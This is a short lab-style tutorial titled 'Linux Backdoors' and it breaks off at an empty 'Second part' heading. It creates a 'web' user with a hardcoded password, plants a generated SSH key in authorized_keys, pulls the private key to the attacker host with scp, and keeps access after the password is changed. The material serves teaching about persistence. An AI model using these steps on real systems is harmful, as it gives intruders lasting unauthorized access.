# Linux Backdoors

## Prerequisites

Victim IP: **192.168.212.151**
Host IP: **192.168.1.132**
Prefered port: **4444**

**Setup.sh** script
```sh
#!/bin/bash

USER="web"

if ! grep -q $USER /etc/passwd
then
    # User does not exist
    useradd -m -s /bin/bash $USER
    echo "Set the password to: l3tmein"
    #passwd $USER
    echo "web:l3tmein" | chpasswd
fi
```


## Instructions

1.1 Create .SSH directory
```sh
# Create .SSH directory
mkdir .ssh

# Create the authorized keys file
touch .ssh/authorized_keys

# Ensure proper permissions
chmod 700 .ssh
chmod 600 .ssh/authorized_keys

# Generare ssh key pairs
ssh-keygen -b 4096 -t rsa

# Copy the public key in the authorized keys file
cat .ssh/id_rsa.pub >> .ssh/authorized_keys

# retrieve the private key from the server using SCP to the local folder
scp web@192.168.212.151:.ssh/id_rsa .

# attempt a connection with the following command
ssh -i id_rsa web@192.168.212.151

# change the password to: web123
passwd web

# check that you cannot log in
``` 

### Second part
